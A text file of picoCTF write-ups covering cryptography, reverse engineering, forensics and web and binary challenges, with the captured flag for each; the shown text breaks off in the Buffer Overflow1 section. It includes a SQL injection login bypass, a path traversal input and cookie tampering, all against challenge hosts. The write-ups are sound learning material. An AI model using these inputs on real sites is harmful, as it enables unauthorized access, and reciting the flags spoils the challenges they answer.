@@ -1,0 +1,2007 @@
+PICOCTF Problem Write-ups by DrSquid
+59 Problems Solved, 11400 Points
+
+Abbreviations:
+    BE: Binary Exploitation
+    RE: Reverse Engineering
+    WE: Web Exploitation
+    C: Cryptography
+    F: Forensics
+
+Solved Problems:
+    File run 1
+    File run 2
+    Includes
+    Basic File Exploit
+    Basic Mod 1
+    Basic Mod 2
+    Inspect HTML
+    SQLiLite
+    Forbidden Paths
+    Secrets
+    Cred Stuff
+    RPS
+    Redaction Gone Wrong
+    Substitution0
+    Substitution1
+    Substitution2
+    Patchme.py
+    Unpackme.py
+    Bloat.py
+    GDB Test Drive
+    Safe Opener
+    Lookey Here
+    Enhance!
+    Morse Code
+    Power Cookie
+    SQL Direct
+    Transposition-Trial
+    Vigenere
+    Unpackme
+    Buffer Overflow0
+    Buffer Overflow1
+    Buffer Overflow2
+    Buffer Overflow3
+    CVE-XXXX-XXXXX
+    Packets Primer
+    Fresh Java
+    Local Authority
+    Sleuthkit Intro
+    Sleuthkit Apprentice
+    Flag Leak
+    Rail Fence
+    Search Source
+    File Types
+    Diffie-Hellman
+    Side Channel
+    Eavesdrop
+    Roboto Sans
+    Bbbbloat
+    St3g0
+    Operation Orchid
+    Operation Oni
+    Sum-O-Primes
+    Very Smooth
+    X-sixty-what
+    Sequences
+    Wizardlike
+    Wine
+    Torrent Analyze
+    Ropfu
+
+Disclaimer:
+    All Write-ups are based on my experience and simply what I did. They may not be the correct 
+    methods. Do not copy and paste the flags, the write-ups are there for you to learn how to do
+    the problem, and so that you can solve the problem properly(or improperly if the method is
+    not good). The hex from the flag may also vary, and thus copy pasting the flag will raise 
+    suspicion in your account. Additionally these write-ups were written in the 'I' format, due 
+    to most write-ups that I've seen essentially narrating what they did and how they solved the 
+    problem. I additionally had little to no knowledge in a few of the topics(ex. Binary Exploitation)
+    before the competition so some of my solutions will have some holes in them if they are older, 
+    however more newer write-ups are more in depth and accurate. These problems were not organized 
+    in chronological order, so be aware of that.
+    
+File run 1(RE):
+    This flag is relatively easy to get. All I did was simply downloading it
+    and then running it in the webshell. I ran this command in the webshell
+    to download the file.
+        wget https://artifacts.picoctf.net/c/311/run
+    With the file downloaded, I need to grant permissions to run the file. 
+    Using my somewhat decent Linux skills I ran the command:
+        chmod +x ./run
+    The run file should have been granted permissions to be able to be ran in the
+    terminal. Afterwards, I ran the command by entering "./run" in the
+    terminal. The flag should appeared before my very eyes:
+    Flag: picoCTF{U51N6_Y0Ur_F1r57_F113_102c30db}
+
+File run 2(RE): 
+    All that is needed to be done is following all of the instructions from the
+    first "File Run" challenge and then instead run the command:
+        ./run Hello!
+    The challenge states that you need to provide the phrase "Hello!" which
+    explains the second argument in the command.
+    I was able to get the flag with ease doing so.
+    Flag: picoCTF{F1r57_4rgum3n7_4653b5f6}
+
+Includes(WE):
+    This challenge requires some digging around a website. Once on the challenge
+    website(http://saturn.picoctf.net:61570/) it appears to be a generic webpage
+    that does not have much included into it. I looked into the source code of
+    the website to find nothing. As the hint says, there is indeed stuff beyond 
+    the web inspector. I decided to check the sources to see if anything of 
+    any interest were to show up. I saw two files that could potentiall be of
+    interese(styles.css and script.js). I went to 'styles.css' to find:
+        body {
+          background-color: lightblue;
+        }
+
+        /*  picoCTF{1nclu51v17y_1of2_  */
+    The first part of the flag(on the bottom of the file) is right there,
+    and now it is on to the second part of the flag. Going to the second
+    file in the sources(script.js), this was what was on it:
+        function greetings()
+        {
+          alert("This code is in a separate file!");
+        }
+        //  f7w_2of2_4d305f36}
+    The last part of the flag is on the last line of the script. When combining
+    the flag fragments I got the flag: picoCTF{1nclu51v17y_1of2_f7w_2of2_4d305f36}
+
+Basic File Exploit(BE):
+    This problem involves a connection with netcat. I connected to the listener,
+    with "nc saturn.picoctf.net 49700" and I was prompted with:
+        Type '1' to enter a phrase into our database
+        Type '2' to echo a phrase in our database
+        Type '3' to exit the program
+    I did a little bit of trial and error with the functions, but I soon figured
+    the way to exploit the script and get the flag. Here's how I found the flag:
+
+    First follow the normal protocol for the entering of a phrase into the database.
+    Once done, use the second option. Instead of entering an integer when it asks
+    for the entry number, enter a different type of character like a string or a
+    symbol. This will cause errors in the script when it checks to find an entry
+    number with an invalid character. This will make it display the flag.
+    Here is an example:
+        Please put in a valid number
+        2
+        2
+        Please enter the entry number of your data:
+        s
+        s
+        picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_9F68795F}
+    As you can see, the flag is clear in the last line of the output.
+    That is how I captured the flag.
+
+Basic Mod 1(C):
+    The message that is given to you is:
+        "54 211 168 309 262 110 272 73 54 137 131 383 188 332 39 396 370 182 328 327 366 70"
+    Which appears to be useless numbers without any sort of correlation to the actual
+    flag. This was what I thought in the first case, and then I did some experimentation
+    with the numbers and the mod37 algorithm. I figured that the character set what was
+    stated in the problem was actually something that was needed in deciphering. 
+    I used the operation of 'x%37' I was able to construct a script as such(python):
+        item = [int(x) for x in "54 211 168 309 262 110 272 73 54 137 131 383 188 332 39 396 370 182 328 327 366 70".split()]
+        from string import ascii_uppercase
+        from string import digits
+        chars = list(ascii_uppercase+digits+"_")
+        string_ = ""
+        for i in item:
+            string_ += str(chars[i%37])
+        print(string_) 
+    This uses the same theory that was stated earlier, and has been implemented to be able
+    to decrypt the text into the desired flag.
+    Flag: picoCTF{R0UND_N_R0UND_C0A86577}
+
+Basic Mod 2(C): 
+    This problem is more sophisticated than the last, as it involves the inverse
+    modulo operation. Doing some digging on google, I found that the in-built
+    function 'pow()' can be used to easily do an inverse modulo expression:
+        def inverse(x,m): 
+            return pow(x, -1, m)
+    In this case, x is the number, and m is the modulus. Once the inverse modulus
+    operation is done, it can be used to correspond with the same set of characters
+    from the previous problem. I used this information to my advantage to create
+    a script like this:
+        item = [int(x) for x in "145 167 233 272 344 91 395 393 433 92 77 414 344 318 420 263 87 186 96 103 91 354 161".split()]
+        from string import ascii_uppercase
+        from string import digits
+        chars = list(ascii_uppercase+digits+"_")
+        string = ""
+        def inverse(x,m):
+            return pow(x, -1, m)
+        for i in item:
+            string += chars[inverse(i,41)%41-1]
+        print(string)
+    The script should display the flag at the bottom: picoCTF{1nv3r53ly_h4rd_261cb530}
+
+Inspect HTML(WE):
+    This problem requires the use of the web inspector. I went to the website
+    (http://saturn.picoctf.net:49511/) and went into the web inspector.
+    At the bottom I found something of interest: 
+        <!--picoCTF{1n5p3t0r_0f_h7ml_b6602e8e}-->
+    This contains the flag, which therefore solves the problem.
+
+SQLiLite(WE):
+    I launched the instance to start the website. Once it was started I went to the
+    website, and opened the inspector to see if there was anything fishy that I could
+    manipulate or change. The title of the problem suggests that an SQL injection is
+    needed to do login. The hint of the problem was also that the user is required
+    to log into the 'admin' account. After that, I continued to look for anything out
+    of the ordinary and found this line of code:
+        <input type="hidden" name="debug" value="0">
+    With my half-decent knowledge on websites, I recall you could simply change this
+    value to one, and be able to see some more information that could help figure
+    out the type of attack that can be used to exploit and log into the account.
+    I set the value to one, and tested the login with a random password. This is
+    what I got:
+        username: admin
+        password: password
+        SQL query: SELECT * FROM users WHERE name='admin' AND password='password'
+        Login failed.
+    This confirms that there is an SQL injection that is needed to penetrate the
+    website and luckily enough I still have some rememberance of how to do it.
+    I entered the regular admin name however I changed the password value and
+    entered ' or '1'=='1 which would be able to bypass the password checking and
+    let me in. This worked, and I was logged in. The flag seemed invisible but
+    I checked the web inspector to find it: picoCTF{L00k5_l1k3_y0u_solv3d_it_cd1df56b}
+
+Forbidden Paths(WE): 
+    After going to the website(http://saturn.picoctf.net:52523/), I was inputting
+    some of the regular text files(shown on screen) simply to see what would happen.
+    The text files simply had their content shown, which suggest that some sort of
+    exploit is needed to show the flag.txt file. I already had tried entering flag.txt
+    into the website, which obviously didn't work(I just wanted to make sure).
+    Once doing so, I looked up some file exploits, and figured that putting in 
+    "../../../../filename" would be able to bypass any of the filters that were
+    put into the server. This worked with flag.txt, as it had shown it directly onto
+    the screen: picoCTF{7h3_p47h_70_5ucc355_e73ad00d}
+
+Secrets(WE):
+    I took the hint of "folders folders folders" the correct way. After going to
+    the website(http://saturn.picoctf.net:52114/) I went into the web inspector to 
+    find some "folders". I decided to visit those folders to see what would happen,
+    and when I went http://saturn.picoctf.net:52114/secret/ I saw a gif with Chris
+    Pratt and with a title saying that I am almost there(this took me some time
+    to find actually). I saw another folder in the sources(called hidden) and I
+    went in there to continue my dive into the website. I then saw some weird
+    social media login page that looked very obscure, which I then decided to go
+    into the next sub-folder in http://saturn.picoctf.net:52114/secret/hidden/superhidden/.
+    When going there, I saw this:
+    Finally. You found me. But can you see me
+
+    I didn't exactly see the flag so I checked the web inspector, and I see that it
+    was hiding here:
+        <h3 class="flag">picoCTF{succ3ss_@h3n1c@10n_f55d602d}</h3>
+    With that I was able to find the flag.
+
+Cred Stuff(C): 
+    With an apparent data leak from the black market, it seemed enticing to 
+    figure out this problem the moment I saw it. I downloaded the files
+    containing the usernames and the passwords, and because they correspond
+    with each other, I was able to write a script that does exactly that.
+    The problem said that I needed to find that password of the user called
+    "cultiris", and with that in mind I created this script:
+        passwords = open("passwords.txt","r").readlines()
+        usernames = open("usernames.txt","r").readlines()
+        index = 0
+        for i in usernames:
+            if i.strip() == "cultiris":
+                print(passwords[index])
+                break
+            index += 1
+        I was able to figure out the password, however it looked to be
+        encrypted: cvpbPGS{P7e1S_54I35_71Z3}
+    This of course is not something that I want to see, and I spent
+    a lot of time trying to figure out way to figure out what some
+    of the text was by comparing it to other passwords but to
+    no avail. After a lot of trial and error, I decided to come back
+    later. When I was in the shower, I was able to figure out a 
+    possible shortcut, as I realised the text looked to be from
+    the ROT13 algorithm, so I put the it into an online decoder
+    and I was able to get the flag: picoCTF{C7r1F_54V35_71M3}
+
+RPS(BE): 
+    At first I was puzzled by this game. I seemed to have such good
+    luck that I was able to lose every game. I downloaded the source
+    code of the file, and I was intimidated by the fact that it was
+    using the C language; One that I have no experience in. using
+    logic from my experience with other languages, I found out
+    where the win checking was:
+        if (strstr(player_turn, loses[computer_turn])) {
+            puts("You win! Play again?");
+            return true;
+        }
+    I saw the strstr() function and I looked it up. What it is doing
+    is checking whether a "needle" is in the "haystack" and returns
+    a boolean value. I also looked at the loses[computer_turn] to also
+    find that it checks if the computer losing action was in the player
+    turn input, it would make the player win. I decided to exploit this
+    by inputting "rock paper scissors", which would in theory make me
+    win every time, as the computer would always find its losing action
+    in my input. 
+    This worked, and I was able to capture my flag: picoCTF{50M3_3X7R3M3_1UCK_D80B11AA}
+
+Redaction Gone Wrong(F):
+    I downloaded the PDF document. Once looking at it I saw some "redacted"
+    text. What I did was I copied and pasted the contents of the document
+    into a text editor and this is what it said:
+
+    Financial Report for ABC Labs, Kigali, Rwanda for the year 2021. 
+    Breakdown - Just painted over in MS word.
+    Cost Benefit Analysis
+    Credit Debit
+    This is not the flag, keep looking Expenses from the picoCTF{C4n_Y0u_S33_m3_fully} Redacted document.
+
+    The flag is clearly inside of the document, which solves the problem.
+    Flag: picoCTF{C4n_Y0u_S33_m3_fully}
+
+Substitution0(C):
+    The message downloaded contained a message, conveniently with the cipher in it.
+    I used that to then correspond to the alphabet by making both an array from the
+    cipher and the alphabet. I used that to create this script:
+        from string import ascii_uppercase
+        letters = list(ascii_uppercase)
+        cipher = list("UHQKRNWLFIYJBTODCZVAXEGSMP")
+        string = list("""Lrzrxdot Jrwzutk uzovr, gfal u wzuer utk vauarjm ufz, utk hzoxwla br alr hrrajr
+        nzob u wjuvv quvr ft glfql fa guv rtqjovrk. Fa guv u hruxafnxj vquzuhurxv, utk, ua
+        alua afbr, xtytogt ao tuaxzujfvav—on qoxzvr u wzrua dzfpr ft u vqfrtafnfq dofta
+        on efrg. Alrzr grzr ago zoxtk hjuqy vdoav truz otr rsazrbfam on alr huqy, utk u
+        jotw otr truz alr oalrz. Alr vqujrv grzr rsqrrkftwjm luzk utk wjovvm, gfal ujj alr
+        uddruzutqr on hxztfvlrk wojk. Alr grfwla on alr ftvrqa guv erzm zrbuzyuhjr, utk,
+        auyftw ujj alftwv ftao qotvfkrzuafot, F qoxjk luzkjm hjubr Ixdfarz noz lfv odftfot
+        zrvdrqaftw fa. Alr njuw fv: dfqoQAN{5XH5717X710T_3E0JX710T_7H755H1U}
+        """.upper())
+        o = ""
+        for i in string:
+            if i != " ":
+                found = False
+                for ii in range(len(cipher)-1):
+                    if cipher[ii] == i:
+                        found = True
+                        o += letters[ii]
+                if not found:
+                    o += i
+            else:
+                o += " "
+        print("picoCTF"+o.split("IS:")[1].replace(" ","").split("PICOCTF")[1].strip())
+    The script cycled through the main message, and found out what the index of the
+    letters in the cipher were(didn't just make an array with then and the index),
+    and then I made it refer to the alphabet array with the found index. 
+    This overall allowed me to be able to decrypt the message and thus obtain
+    the flag: picoCTF{5UB5717U710N_3V0LU710N_7B755B1A}
+
+Substitution1(C):
+    Instead of being provided both the cipher and the text, the message had only
+    contained the text, which would mean that there would have to be a lot of tedious
+    work done to then figure out how to decipher everything. I created a simple
+    algorithm to help with substituting encrypted characters into regular ones.
+    This is sort of how it looks like:
+        msg = list("""PZKh (hbutz kut pfszatx zbx kcfd) ftx f zjsx uk puqsazxt hxpatnzj puqsxznznul. Pulzxhzflzh ftx stxhxlzxi gnzb f 
+        hxz uk pbfccxldxh gbnpb zxhz zbxnt ptxfznynzj, zxpblnpfc (fli duudcnld) hencch, fli stuvcxq-hucynld fvncnzj. 
+        Pbfccxldxh ahafccj puyxt f laqvxt uk pfzxdutnxh, fli gbxl hucyxi, xfpb jnxcih f hztnld (pfccxi f kcfd) gbnpb nh 
+        havqnzzxi zu fl ulcnlx hputnld hxtynpx. PZKh ftx f dtxfz gfj zu cxftl f gnix fttfj uk puqsazxt hxpatnzj hencch 
+        nl f hfkx, cxdfc xlyntulqxlz, fli ftx buhzxi fli scfjxi vj qflj hxpatnzj dtuash ftuali zbx gutci kut kal fli 
+        stfpznpx. Kut zbnh stuvcxq, zbx kcfd nh: snpuPZK{KT3WA3LPJ_4774PE5_4T3_P001_X57444FP}
+        """.lower())
+        table = [
+            ["s","p"],
+            ["n","i"],
+            ["p","c"],
+            ["u","o"],
+            ["z","t"],
+            ["k","f"],
+        ]
+        print(f"{len(table)}\n")
+        main_str = ""
+        for i in msg:
+                found = False
+                if i in [x[0] for x in table]:
+                    for ii in table:
+                        if ii[0] == i:
+                            main_str += ii[1]
+                            found = True
+                            break
+                if not found:
+                    main_str += i
+        print(main_str)
+    It has the encrypted text in it and it uses the available substitutions inside of an array. 
+    I already knew what letters picotf were, due to the flag being prevalent at the end, just
+    encrypted. After that, I had to use my logic skills and frequency attack tools to further 
+    figure out more substitutions. Eventually my table looked like this:
+        table = [
+            ["s","p"],
+            ["n","i"],
+            ["p","c"],
+            ["u","o"],
+            ["z","t"],
+            ["k","f"],
+            ["x","e"],
+            ["f","a"],
+            ["b","h"],
+            ["j","y"],
+            ["v","b"],
+            ["c","l"],
+            ["d","g"],
+            ["t","r"],
+            ["a","u"],
+            ["h","s"],
+            ["q","m"],
+            ["l","n"],
+            ["y","v"],
+            ["e","k"],
+            ["i","d"],
+            ["g","w"],
+            ["w","q"],
+        ]
+    After running my algorithm, I was able to get the flag: picoCTF{FR3QU3NCY_4774CK5_4R3_C001_E57444AC}
+
+Substitution2(C): 
+    I used a very similar method compared to the last one. The only difference was that there was
+    no spaces in between the words, so it only took a little bit longer to figure everything out.
+    I had a table like this:
+        table = [
+            ["a","e"],
+            ["b","l"],
+            ["c","t"],
+            ["d","p"],
+            ["e","n"],
+            ["l","a"],
+            ["m","o"],
+            ["t","m"],
+            ["o","g"],
+            ["p","f"],
+            ["q","i"],
+            ["r","u"],
+            ["s","c"],
+            ["w","h"],
+            ["z","s"],
+            ["i","r"],
+            ["u","y"],
+            ["x","d"],
+            ["n","b"],
+            ["h","k"],
+            ["k","v"],
+            ["j","w"],
+            ["f","x"],
+            ["y","q"]
+        ]
+    With that I was able to get the flag: picoCTF{N6R4M_4N41Y515_15_73D10U5_6CDAEA76}
+
+Patchme.py(RE):
+    I downloaded the python file and I knew things were going to be good once I figured that
+    it was python(my native language). I looked around the script and took interest in this
+    particular if statement:
+        if( user_pw == "ak98" + \
+                      "-=90" + \
+                      "adfjhgj321" + \
+                      "sleuth9000"):
+            print("Welcome back... your flag, user:")
+            decryption = str_xor(flag_enc.decode(), "utilitarian")
+            print(decryption)
+    I noticed concatenation and fragments of the passkey, so I decided to put them together
+    to get this passkey: ak98-=90adfjhgj321sleuth9000
+    When I entered it, it said I had the correct key and said:
+    Welcome back... your flag, user:
+    picoCTF{p47ch1ng_l1f3_h4ck_c3daefb9}
+    I was able to get the flag.
+
+Unpackme.py(RE): 
+    I noticed that the contents of the script were encrypted, and were executed
+    using the in-built exec() function. I noticed that it also ran the contents
+    of 'plain.decode()', and I decided to print it out. Here is what I got:
+        pw = input('What\'s the password? ')
+
+        if pw == 'batteryhorse':
+          print('picoCTF{175_chr157m45_188ab8c9}')
+        else:
+          print('That password is incorrect.')
+    I figure out what the flag was, as it was in plain text, and I was able to 
+    solve the problem.
+    Flag: picoCTF{175_chr157m45_188ab8c9}
+
+Bloat.py(RE):
+    Reverse engineering this was complicated, as at first it looked very intimidating.
+    It was hard to understand what it was saying with all of the weird names and all of
+    the concatenation filled with list indices. I decided to play around with it,
+    printing out the concatenation to see if any of the information seemed to matter.
+    Eventually I came across this string:
+    a[71]+a[64]+a[79]+a[79]+a[88]+a[66]+a[71]+a[64]+a[77]+a[66]+a[68]
+    This was able to return the value of 'happychance' which seemed to be the encryption
+    key. I was too lazy to input 'happychance' as an input into the script, so I decided
+    to just refer the key checking function with the weird string still on my clipboard:
+    arg133(a[71]+a[64]+a[79]+a[79]+a[88]+a[66]+a[71]+a[64]+a[77]+a[66]+a[68])
+
+    After all of that, I was able to see what the flag was:
+    Welcome back... your flag, user:
+    picoCTF{d30bfu5c4710n_f7w_2769cf94}
+
+GDB Test Drive(RE): 
+    All I did was follow the instructions from the problem to get the flag
+    after downloading the file: 
+        $ chmod +x gdbme
+        $ gdb gdbme
+        (gdb) layout asm
+        (gdb) break *(main+99)
+        (gdb) run
+        (gdb) jump *(main+104)
+    After following them I was able to get my flag: picoCTF{d3bugg3r_dr1v3_50e616ac}
+
+Safe Opener(RE):
+    I am not very familiar with Java, however I was still able to get the flag here.
+    I did some looking through the script, and found something of interest inside
+    of the openSafe function:
+        public static boolean openSafe(String password) {
+            String encodedkey = "cGwzYXMzX2wzdF9tM18xbnQwX3RoM19zYWYz";
+
+            if (password.equals(encodedkey)) {
+                System.out.println("Sesame open");
+                return true;
+            }
+    I also noticed something in the main function:
+        System.out.print("Enter password for the safe: ");
+        key = keyboard.readLine();
+
+        encodedkey = encoder.encodeToString(key.getBytes());
+        System.out.println(encodedkey);
+          
+        isOpen = openSafe(encodedkey);
+    it encodes any input into base64 and called the openSafe function
+    with the encoded text, so I therefore made a simple python script 
+    to decode it as I do not know Java:
+        import base64
+        print(base64.b64decode(b'cGwzYXMzX2wzdF9tM18xbnQwX3RoM19zYWYz').decode())
+    I got this value from decoding: pl3as3_l3t_m3_1nt0_th3_saf3
+    Afterwards I put it into the picoCTF format by doing: picoCTF{pl3as3_l3t_m3_1nt0_th3_saf3}
+
+Lookey Here(F):
+    This flag was very easy to find, as it merely involved downloading a text file
+    and then doing ctrl+f with 'picoCTF' to figure out what the flag was. The
+    segment that had the flag looked like this:
+        have walked the length of our tunnel, with a candle lighting the
+        way. We could go no farther than half a mile, for earth and rock
+        had fallen at both ends. But we gathered all the things we found
+        and we brought them to our work place. We found strange boxes
+        with bars of metal inside, with many cords and strands and coils
+        of metal. We found wires that led to strange little globes of
+        glass on the walls; they contained threads of metal thinner than
+        a spider’s web.
+
+        These things help us in our work. We do not understand them, but
+        we think that the men of picoCTF{gr3p_15_@w3s0m3_4554f5f5}
+    At the end there is the flag, which solves the problem.
+    Flag: picoCTF{gr3p_15_@w3s0m3_4554f5f5}
+
+Enhance!(F):
+    With this file being an SVG, it means that users would be able to see the image in
+    a readable text format, which allows them to also extract any information from them.
+
+    I used this to my advantage and opened the svg in my text editor. When I opened it, 
+    I saw some fishy things on the bottom. This is what it looked like:
+    <text
+       xml:space="preserve"
+       style="font-style:normal;font-weight:normal;font-size:0.00352781px;line-height:1.25;font-family:sans-serif;letter-spacing:0px;word-spacing:0px;fill:#ffffff;fill-opacity:1;stroke:none;stroke-width:0.26458332;"
+       x="107.43014"
+       y="132.08501"
+       id="text3723"><tspan
+         sodipodi:role="line"
+         x="107.43014"
+         y="132.08501"
+         style="font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;"
+         id="tspan3748">p </tspan><tspan
+         sodipodi:role="line"
+         x="107.43014"
+         y="132.08942"
+         style="font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;"
+         id="tspan3754">i </tspan><tspan
+         sodipodi:role="line"
+         x="107.43014"
+         y="132.09383"
+         style="font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;"
+         id="tspan3756">c </tspan><tspan
+         sodipodi:role="line"
+         x="107.43014"
+         y="132.09824"
+         style="font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;"
+         id="tspan3758">o </tspan><tspan
+         sodipodi:role="line"
+         x="107.43014"
+         y="132.10265"
+         style="font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;"
+         id="tspan3760">C </tspan><tspan
+         sodipodi:role="line"
+         x="107.43014"
+         y="132.10706"
+         style="font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;"
+         id="tspan3762">T </tspan><tspan
+         sodipodi:role="line"
+         x="107.43014"
+         y="132.11147"
+         style="font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;"
+         id="tspan3764">F { 3 n h 4 n </tspan><tspan
+         sodipodi:role="line"
+         x="107.43014"
+         y="132.11588"
+         style="font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;"
+         id="tspan3752">c 3 d _ 6 7 8 3 c c 4 6 }</tspan></text>
+    I noticed that in every <tspan> tag I saw what appeared to be fragments of a flag. I copied and
+    pasted these fragments onto a text editor, in the order of top to bottom.
+    After that, I got this: picoCTF{ 3 n h 4 n c 3 d _ 6 7 8 3 c c 4 6 }
+    I knew this was the flag, so I decided to remove all of the spaces so that it could be valid.
+    Doing this, I solved the problem.
+    Flag: picoCTF{3nh4nc3d_6783cc46}
+
+Morse Code(C): 
+    This was an interesting problem, as it needed me to open audacity which is an app that I have not
+    used in maybe a year or so. I imported the morse code file into audacity, and turned on the 
+    spectrograph setting, and I edited the other settings such that range and gain were at 20dB and 
+    turned on the grayscale option to see the morse code better.
+    With the morse code being more clear, I typed it out so I can put it into an translator:
+    .-- .... ....- --...   .... ....- --... ....   ----. ----- -..   .-- ..--- ----- ..- ----. .... --...
+    --> WH47H47H90DW20U9H7
+    While these do have the contents of the key, I realised that I still needed to separate any 
+    spaces inside of the more code and replace them with _'s. I also had to make everything lowercase. 
+    Once I did so I had: wh47_h47h_90d_w20u9h7 and therefore making the flag: picoCTF{wh47_h47h_90d_w20u9h7}
+
+Power Cookie(WE): 
+    Once going to the website(http://saturn.picoctf.net:55771/) I decided to look around the sources to see
+    if any exploitations can be done based on the information. I looked through the sources and found the
+    file called 'guest.js' which has its script executed when the 'continue as guest' button is pressed:
+    guest.js:
+        function continueAsGuest()
+        {
+          window.location.href = '/check.php';
+          document.cookie = "isAdmin=0";
+        }
+    Execution of 'continueAsGuest()':
+        <button type="button" onclick="continueAsGuest();">Continue as guest</button>
+    I checked the 'document.cookie' on the guest.js, and it seemed that it I can exploit this by changing
+    my cookie to be the admin. I first clicked the button with 'continue as guest' and I went into the web
+    inspector to get and change my cookies. I set the "isAdmin" key to 1, and reloaded the page. The moment
+    it loaded, the flag was there: picoCTF{gr4d3_A_c00k13_80bad8fa}
+    
+SQL Direct(WE):
+    After running the instance, I connected to the Postgres SQL server by running this command from the instructions:
+        psql -h saturn.picoctf.net -p 60324 -U postgres pico
+    I entered the password 'postgres' and I logged in. I ran the command '\d+' to see what I'm working with,
+    and this what I got:
+                          List of relations
+        Schema | Name  | Type  |  Owner   | Size  | Description 
+        -------+-------+-------+----------+-------+-------------
+        public | flags | table | postgres | 16 kB | 
+    With this in mind, it looks like the table I'm trying to spit out information is 'flags'. I turned on Expanded
+    display by running '\x', and then I ran 'SELECT * FROM flags;', which spat out:
+        -[ RECORD 1 ]-------------------------------------
+        id        | 1
+        firstname | Luke
+        lastname  | Skywalker
+        address   | picoCTF{L3arN_S0m3_5qL_t0d4Y_34fa2564}
+        -[ RECORD 2 ]-------------------------------------
+        id        | 2
+        firstname | Leia
+        lastname  | Organa
+        address   | Alderaan
+        -[ RECORD 3 ]-------------------------------------
+        id        | 3
+        firstname | Han
+        lastname  | Solo
+        address   | Corellia
+    It appears that the table has star wars characters and their 'addresses'. Looking at Luke Skywalker's profile,
+    it was quite obvious that his address was really the flag.
+    Flag: picoCTF{L3arN_S0m3_5qL_t0d4Y_34fa2564}
+
+Transposition-Trial(C):
+    After downloading the file, I had what appears to be a corrupt message with the flag. The hint stated that I
+    should split the message into blocks of 3, and I wrote a script to do so:
+        string = "heTfl g as iicpCTo{7F4NRP051N5_16_35P3X51N3_VC85A020}E"
+        item = list(string)
+        new_ls = []
+        index = 0
+        st = ""
+        for i in item:
+            st += i
+            index += 1
+            if index == 3:
+                index = 0
+                new_ls.append(st)
+                st = ""
+        print(new_ls)
+    Once I ran the script, I got something like this:
+        ['heT', 'fl ', 'g a', 's i', 'icp', 'CTo', '{7F', '4NR', 'P05', '1N5', '_16', 
+        '_35', 'P3X', '51N', '3_V', 'C85', 'A02', '0}E']
+    I noticed that the last character was originally the first character in the blocks of 3, so I added onto the
+    script with the code here: 
+        _st = ""
+        for i in new_ls:
+            lsi = list(i)
+            switched = lsi[2]
+            del lsi[2]
+            _st += switched + "".join(lsi)
+        print(_st)
+    My guess was right, as the message what popped out was in fact the key:
+        The flag is picoCTF{7R4N5P051N6_15_3XP3N51V3_5C82A0E0}
+
+Vigenere(C):
+    With another encrypted version of the flag, I didn't want to experience the suffering 
+    that I had to experience during the 'substitution' problems, and I googled a Vigenere 
+    Cipher decoder. Since the key was already given(CYLAB), All I had to do was enter 
+    "rgnoDVD{O0NU_WQ3_G1G3O3T3_A1AH3S_a23a13a5}" as the cipher and "CYLAB" as the key,
+    which gives me the flag: picoCTF{D0NT_US3_V1G3N3R3_C1PH3R_y23c13p5}
+
+Unpackme(RE):
+    I decided to use the webshell for this one, as I assumed it has more packages installed
+    for reverse engineering binaries compared to my computer. I first downloaded the UPX file with:
+        wget https://artifacts.picoctf.net/c/368/unpackme-upx
+    When I was doing some research on UPX, I realised I had to decompress it. I decided to run
+        upx -d unpackme-upx
+    which allowed me to be able to see the binaries and layout of it in gdb. I ran the following
+    command to get the output:
+        (gdb) layout asm
+        |   0x401ed3 <main+96>      mov    $0x0,%eax                             │
+        │   0x401ed8 <main+101>     callq  0x410df0 <printf>                     │
+        │   0x401edd <main+106>     lea    -0x3c(%rbp),%rax                      │
+        │   0x401ee1 <main+110>     mov    %rax,%rsi                             │
+        │   0x401ee4 <main+113>     lea    0xb1135(%rip),%rdi        # 0x4b3020  │
+        │   0x401eeb <main+120>     mov    $0x0,%eax                             │
+        │   0x401ef0 <main+125>     callq  0x410f80 <__isoc99_scanf>             │
+        │   0x401ef5 <main+130>     mov    -0x3c(%rbp),%eax                      │
+        │   0x401ef8 <main+133>     cmp    $0xb83cb,%eax                         │
+        │   0x401efd <main+138>     jne    0x401f42 <main+207>                   │
+        │   0x401eff <main+140>     lea    -0x30(%rbp),%rax                      │
+        │   0x401f03 <main+144>     mov    %rax,%rsi                             │
+        │   0x401f06 <main+147>     mov    $0x0,%edi                             │
+        │   0x401f0b <main+152>     callq  0x401db5 <rotate_encrypt>             │
+        │   0x401f10 <main+157>     mov    %rax,-0x38(%rbp)                      │
+        │   0x401f14 <main+161>     mov    0xdd7b5(%rip),%rdx        # 0x4df6d0  │
+        │   0x401f1b <main+168>     mov    -0x38(%rbp),%rax                      │
+        │   0x401f1f <main+172>     mov    %rdx,%rsi                             │
+        │   0x401f22 <main+175>     mov    %rax,%rdi                             |
+    I set my breakpoint to <main+101> and I investigated the layout a little more to gain more
+    insight. I noticed something different about <main+140> and I decided to give that one a
+    shot with jumping. I also found it to be similar to the layout on the test run(lea type and
+    a similar structure), so it looked like it could do something in this problem. After running 
+    the script I ran:
+        (gdb) jump *(main+140)
+    To my suprise, this made it spit out the flag: picoCTF{up><_m3_f7w_01fb99cd}
+
+Buffer Overflow0(BE): 
+    This problem involved to connecting to an external source via netcat:
+        nc saturn.picoctf.net 64712
+    What I simply did was attempt to overflow the buffer by entering a very long string,
+    by simply spamming my keyboard.
+    Although my method was a little unorthodox, it still worked as I managed to capture
+    the flag: picoCTF{ov3rfl0ws_ar3nt_that_bad_81929e72}
+
+Buffer Overflow1(BE):
+    This problem involved more problem solving skills than anticipated. It was much more
+    difficult(at first) than I thought, and I had to watch a 16 minute video to help me
+    understand the topic(https://www.youtube.com/watch?v=V9lMxx3iFWU). I did some reverse
+    engineering(using gdb) to find out the return address of the flag function, to which it
+    was here:
+        |   0x80491f0 <frame_dummy>                 endbr32                                    │
+        │   0x80491f4 <frame_dummy+4>               jmp    0x8049180 <register_tm_clones>      │
+        │   0x80491f6 <win>                         endbr32                                    │
+        │   0x80491fa <win+4>                       push   %ebp                                │
+        │   0x80491fb <win+5>                       mov    %esp,%ebp                           │
+        │   0x80491fd <win+7>                       push   %ebx                                │
+        │   0x80491fe <win+8>                       sub    $0x54,%esp                          │
